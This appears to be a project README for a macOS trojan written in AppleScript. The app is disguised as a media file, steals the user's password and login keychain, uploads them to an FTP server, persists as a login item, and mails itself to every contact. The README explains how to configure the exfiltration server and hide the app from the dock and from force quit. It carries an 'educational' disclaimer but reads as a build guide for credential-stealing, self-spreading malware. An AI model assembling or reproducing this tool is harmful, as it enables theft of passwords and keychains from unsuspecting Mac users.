Benb116's Phishing app for Mac
==========================

**Use this tool at your own risk. Don't do anything illegal. I do not accept any responsibility for any damages or harm done. This is purely an educational endeavor (for me).**

This is a phishing app that I wrote. It is written in applescript, which is important because it shows that potentially harmful tools can be written using a simple language and relatively limited programming knowledge. It is small and works on macs, whose users often don't worry about malware on their computers. This makes the app more effective, especially when disguised as a music file or photo. 

###Here's what it does:

* It checks for a killswitch, then creates a hidden folder in the user's Public folder.
* It copies a 2nd app to the hidden folder and sets it as a login item
* It prompts the user to enter their password into a dialog box. If the user doesn't enter it within 10 seconds, the script kills all user processes, making the user have to restart in order to use the computer.
![image](http://f.cl.ly/items/3E0x2P0l452W2B1p2T0m/Prompt.png)
*  If the password is entered correctly, the script copies the user's username, password, date, WAN IP, and LAN IP to a text file in the hidden folder
 ![image](http://cl.ly/KB3S/Screenshot%202012-10-16%20at%206.47.02%20AM.jpg)
*  It uploads this file to an FTP server
*  It copies the user's login keychain into the same folder and uploads it to the same FTP server
*  It sends an email to all of the user's contacts' emails with the app attached.

###Please feel free to test the script by doing the following:

1. In 'App.applescript' and 'Updater.applescript' find the FTP command elements.
2. Replace the parts of the code in '<>' with your information.
	
		set myuser to "<Username>"		set mypass to "<Password>"		set myserv to "<ftp address>"		set mypath to "</path/to/folder/>"
		
	becomes
	
		set myuser to "Benb116"		set mypass to "12345"		set myserv to "123.456.789.0"		set mypath to "/Desktop/Passwords/"3. Save App.applescript as an application (example name "App.app")
4. Add the following 2 lines of code to the "info.plist" file in "App.app/Contents/" folder

		<key>NSUIElement</key>
        <string>1</string>
(this prevents a dock icon from appearing and also makes it impossible to force quit the app)
5. Add "icon.icns" to the resources folder of "App.app"
6. Repeat step 3 - 5 for "Updater.app" - **This MUST be named "Updater.app" for the script to work**
7.  Save DK.applescript as an application named "DK.app"
8. Copy Updater.app and DK.app to the resources folder "App.app"

The resources folder of the "App.app" should look something like this:

![image](http://cl.ly/Lz5q/Screen%20Shot%202013-01-06%20at%209.32.02%20PM.png)
